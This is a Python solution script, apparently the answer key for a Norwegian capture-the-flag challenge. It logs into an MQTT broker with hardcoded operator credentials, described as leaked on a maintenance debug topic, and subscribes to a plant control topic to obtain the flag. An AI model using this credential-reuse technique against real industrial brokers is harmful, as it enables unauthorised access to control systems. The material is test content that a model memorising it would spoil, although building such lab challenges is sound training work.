"""
LØSNING (ikke gi til deltakerne!)

Steg 1: Kjør mqtt_recon.py → se plant/maintenance/debug → finn creds
Steg 2: Koble til med operator-creds → subscribe plant/control/secure → flagg
"""

import sys, json, time
import paho.mqtt.client as mqtt

TARGET_IP = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1883

# Creds funnet via plant/maintenance/debug
USER = "operator"
PASS = "Pl4tform42!"

found = []

def on_connect(client, userdata, flags, rc):
    print(f"[+] Tilkoblet som '{USER}'")
    client.subscribe("plant/control/secure")

def on_message(client, userdata, msg):
    data = json.loads(msg.payload)
    print(f"\n[+] Topic: {msg.topic}")
    print(f"[+] FLAGG: {data['flag']}")
    found.append(data["flag"])

client = mqtt.Client(protocol=mqtt.MQTTv311)
client.username_pw_set(USER, PASS)
client.on_connect = on_connect
client.on_message = on_message
client.connect(TARGET_IP, PORT)
client.loop_start()

timeout = 10
while not found and timeout > 0:
    time.sleep(1)
    timeout -= 1

client.loop_stop()
client.disconnect()
